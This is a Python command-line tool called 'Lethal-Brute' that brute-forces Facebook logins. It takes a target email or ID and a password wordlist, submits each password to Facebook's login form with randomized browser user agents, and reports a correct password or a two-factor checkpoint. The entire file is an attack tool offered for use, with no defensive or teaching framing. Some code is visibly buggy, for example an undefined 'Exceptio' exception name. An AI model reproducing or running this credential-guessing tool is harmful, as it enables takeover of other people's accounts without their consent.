import time
import random
from requests import head
import platform
from time import sleep
import requests
import os
from os import system
import sys
import re
import mechanize
wi="\033[1;37m"

rd="\033[1;31m"
gr="\033[1;32m"
yl="\033[1;33m"

red="\033[0;31m"

green="\033[0;32m"
yellow="\033[0;33m"

blue="\033[0;34m"

cyan="\033[0;36m"
white="\033[0;37m"
target = ""

wordlist = ""

os.system("cls||clear")




about=f"""

{yellow}[{red}-{yellow} Author: GenrevReyes [Philippines]

{yellow}[{red}-{yellow} Github: https://www.github.com/Genrev-Reyes

{yellow}[{red}-{yellow} Group: LethalCommunity

{yellow}[{red}-{yellow} Tool_name: Lethal-Brute

"""

def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()



try:
    head("http://facebook.com")
except Exceptio as e:
    sleep(1)
    print(f'{ree}[!] No Internet')
    sleep(1)
    sys.exit()




system("clear")
Banner=f"""

{yellow}    > 𝕱𝖆𝖈𝖊𝖇𝖔𝖔𝖐 𝕭𝖗𝖚𝖙𝖊𝗳𝖔𝖗𝖈𝖊 <
{green}  

╭╮╱╱╱╱╱╭╮╭╮╱╱╱╱╭╮╱╱╭━━╮╱╱╱╱╱╭╮
┃┃╱╱╱╱╭╯╰┫┃╱╱╱╱┃┃╱╱┃╭╮┃╱╱╱╱╭╯╰╮
┃┃╱╱╭━┻╮╭┫╰━┳━━┫┃╱╱┃╰╯╰┳━┳╮┣╮╭╋━━╮
┃┃╱╭┫┃━┫┃┃╭╮┃╭╮┃┣━━┫╭━╮┃╭┫┃┃┃┃┃┃━┫
┃╰━╯┃┃━┫╰┫┃┃┃╭╮┃╰┳━┫╰━╯┃┃┃╰╯┃╰┫┃━┫
╰━━━┻━━┻━┻╯╰┻╯╰┻━╯╱╰━━━┻╯╰━━┻━┻━━╯
{yellow}               [Author: GenrevReyes]


"""




versionPath = "core"+os.sep+"version.txt"

errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)

def check_version():
    if platform.system() == "Mac":
        sleep(2)
        print(f'{red}[!] Your Version Is Not Supported')
        sys.exit()
    if platform.system() == "Windows":
        print(f'{red}[!] Your Version Is Not Supported')
        sys.exit()


class FaceBook(object):

    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]




    
    def login(self,target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email']=target
            self.br.form['pass']= password
            self.br.method ="POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
            elif "checkpoint" in self.br.geturl(): return 2
            return 0
        except(KeyboardInterrupt, EOFError):
            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd+" Error: "+yl+str(e)+wi+"\n")
            time.sleep(0.60)


    def banner(self,target,wordlist):
        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
        print(gr+"""
=====================================
[>] Target      :> """+wi+target+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(wordlist)+gr+"""
====================================="""+gr+"""
[ >>>    Facebook Bruteforce    <<< ]
=====================================\n"""+wi)
)


def Start():
   print(Banner)
   check_version()
   facebook = FaceBook()
   global target, wordlist
   while True:
       console = input(f'{green}Lethal-Brute ==> {white}')
       print(" ")
       print(" ")
       if console == "set email":
           sleep(1)
           target = input(f'{yellow}[+] Enter Facebook email/id ==>{white} ')
           sleep(0.5)
           print(f'{green}[-] Email ==> {target}')
           print(" ")
       if console == "set wordlist":
           sleep(1)
           wordlist = input(f'{yellow}[+] Enter Wordlist/path ==>{white} ')
           sleep(0.5)
           print(f'{yellow}[-] Wordlist ==>{cyan} {wordlist}')
           print(" ")

       if console == "help":
           print(f'{yellow}[{red}-{yellow}] set email')
           print(" ")
           print(f'{yellow}[{red}-{yellow}] set wordlist')
           print(" ")
           print(f'{yellow}[{red}-{yellow}] show options')
           print(" ")
           print(f'{yellow}[{red}-{yellow}] run')
           print(" ")
           print(f'{yellow}[{red}-{yellow}] clear')
           print(" ")
           print(f'{yellow}[{red}-{yellow}] exit')

       if console == "show options":
           print(f'{green}[{red}-{green}]{yellow} Email ==>{cyan} {target}')
           print(" ")
           print(f'{green}[{red}-{green}]{yellow} Wordlist ==>{cyan} {wordlist}')
           print(" ")

       if console == "run":
           sleep(1)
           print(f'{green}[-] Running..!')
           sleep(2)
           break
       if console == "clear":
           system("clear")
           print(Banner)
       if console == "exit":
           sys.exit()

       if console == "about":
           print(about)
           key = input(" ")
           sleep(1)
           system("python3 Lethal-Brute.py")

   opts = (target, wordlist)
   if wordlist:
       if not os.path.isfile(wordlist):
           errMsg(f"[-] {wordlist} Not Found..!")
           sys.exit()

       facebook.banner(target, wordlist)
       loop,passwords = (1,open(wordlist).readlines())
       for passwd in passwords:
           passwd = passwd.strip()
           if len(passwd) <6:continue
           print(f'{green}[{red}-{green}]{yellow} Trying Password ==>{white} [> {passwd} <]')

           Account = facebook.login(target, passwd)


           if Account:
                sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                print(wi+"========================="+"="*len(passwd)+"======")
                print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                print(wi+"========================="+"="*len(passwd)+"======")
                if Account == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                break
           else:
                print(" ")
                sys.stdout.write(yl+"Login"+rd+" Failed\n")
                print(" ")




if __name__=='__main__':
    Start()
